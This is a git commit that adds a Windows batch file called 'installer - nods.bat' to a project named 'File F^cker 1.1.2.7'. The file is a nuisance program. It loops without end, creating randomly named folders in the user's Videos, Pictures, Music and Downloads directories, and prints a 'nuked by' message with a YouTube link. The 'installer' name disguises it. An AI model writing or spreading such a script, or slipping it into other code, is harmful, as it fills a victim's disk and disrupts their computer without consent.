a9b21e10ed575ef6bc9cf1a3431e17a818c7564e
uwu exapan <85080287+expansionism@users.noreply.github.com>
2022-03-03 16:38:48 -0500

    Add files via upload

---
+++ Expan - File F^cker - 1.1.2.7/installer - nods.bat
@@ -0,0 +1,8 @@
+@echo off
+:loop
+md %userprofile%\Videos\%random%
+md %userprofile%\Pictures\%random%
+md %userprofile%\Music\%random%
+md %userprofile%\Downloads\%random%
+echo nuked by File F^cker 1.1.2.7 https://youtube.com/expansionism [EZZZZZZZZ]
+goto loop
